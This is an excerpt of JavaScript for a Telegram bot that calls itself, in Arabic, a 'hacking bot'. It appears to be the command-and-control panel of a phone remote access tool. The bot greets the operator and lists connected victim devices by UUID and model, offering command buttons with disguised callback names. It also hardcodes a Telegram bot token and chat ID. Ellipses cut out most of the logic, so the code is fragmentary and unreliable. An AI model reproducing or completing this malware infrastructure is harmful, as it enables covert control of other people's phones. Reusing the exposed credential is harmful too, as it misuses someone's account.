...
const token = '8058542693:AAGixP17c3SFTCXf6JYFf6pH4JnlBIVPHu0'
const id = '1002670694'
...
app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : 𓅓 ابن اليمن 𓅓المطور : @Y_20_20</h1>')
})
...
appBot.on('message', (message) => {
    ...
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• مرحبا بكم في بوت الاختراق مطور البوت 𓅓 ابن اليمن 𓅓المطور : @Y_20_20\n\n' +
        ...
        appBot.editMessageText(`°• حدد الثناء للجهاز : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            ...
            reply_markup: {
                inline_keyboard: [
                    ...
                    [
                        {text: 'جديد 1', callback_data: `forEach:${uuid}`},
                        {text: 'جديد 2', callback_data: `headers:${uuid}`}
                    ],
                    [
                        {text: 'جديد 3', callback_data: `handshake:${uuid}`},
                        {text: 'جديد 4', callback_data: `isRedirect:${uuid}`}
                    ],
                    [
